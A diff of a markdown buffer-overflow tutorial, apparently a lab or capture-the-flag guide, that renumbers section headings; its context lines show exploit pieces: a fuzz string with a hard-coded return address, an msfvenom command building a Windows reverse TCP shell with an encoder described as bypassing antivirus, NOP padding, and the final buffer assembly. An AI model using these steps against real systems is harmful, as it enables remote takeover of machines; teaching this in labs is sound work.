@@ -227,7 +227,7 @@ retrn = "\xAF\x11\x50\x62"
 fuzz = "A" * offset + retrn + "C" * (3000 - 4 - offset)
 ```
 
-### 5. Creating Payload
+### 7. Creating Payload
 
 Once we are sure that our code is working and redirecting execution to our payload. we can then go ahead and create our payload to grant us a reverse shell.  
 kali:
@@ -246,7 +246,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=tun0 LPORT=4444 -a x86 --platform wi
 * -e: encoder \(used to bypass antivirus\)
 * -f: format of output \(py = python output\)
 
-### **6. NOPS**
+### **8. NOPS**
 
 Once we have generated our payload we need to add in padding to provide space for our payload to decode itself. We can use [NOP](https://en.wikipedia.org/wiki/NOP_%28code%29) instructions for this which are represented in hex as \x90.
 
@@ -268,7 +268,7 @@ buffer = prefix + " " + fuzz + retrn + padding + buf
 * padding: NOPS to allow payload to decode
 * buf: shellcode for reverse shell
 
-### 7.TROUBLESHOOTING
+### 9.TROUBLESHOOTING
 
 * Check IP address - You may be pointing at your dev machine instead of the target you are trying to exploit
 * Make sure we are using the right payload in msfvenom for the target
